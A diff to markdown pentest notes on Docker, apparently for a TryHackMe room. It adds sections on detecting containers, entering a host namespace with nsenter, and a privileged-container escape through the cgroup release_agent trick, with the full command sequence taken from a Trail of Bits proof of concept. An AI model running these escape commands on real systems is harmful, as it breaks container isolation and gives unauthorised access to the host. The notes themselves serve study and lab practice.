@@ -3,6 +3,12 @@ How do you know you are in a docker container?
 [pspy](https://github.com/DominicBreuker/pspy) on Linux
 Systernals proc\*-related tools or access with tasklist for windows.
 
+## How to know when you are in a container
+```bash
+.dockerenv
+cat /proc/$pid/cgroup | grep docker
+```
+
 ## Preface
 Add IP and domain name to /etc/hosts
 ```bash
@@ -93,18 +99,44 @@ Then upload with push:
 docker push
 ```
 
-
-## Building a Docker container
-
+## Shared Namespaces
+Namespaces segregate system resources. Have root access inside the container or potential use pspy. 
+Find a namespace
 ```bash
-docker run  -d --privileged -v /:/host:rw $image
-
-FROM $dir/$image
+ps aux
+```
+We then mount the namespace of the process running outside of the container with a sh shell.
+```
+nsenter --target $PID --mount sh
 ```
 
-[Docker setup of kali  for hackers check this article](https://www.pentestpartners.com/security-blog/docker-for-hackers-a-pen-testers-guide/)
+## Misconfigured Privilieges
+If a docker container is running with privileged mode it bypasses the Docker engine and has direct communication with host OS. List container capabilities with:
+```
+capsh --print | grep # admin chroot sys_module sys_time
+```
+The commented out greppables indicate privilege mode. [PoC](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
+```bash
+# On the host
+# docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+ 
+# In the container
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+ 
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+ 
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+ 
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
 
 ## References
 
 [Docker](https://docs.docker.com/get-started/overview/)
 [THM Room](https://tryhackme.com/room/dockerrodeo)
+[trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
+[cgroups](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)
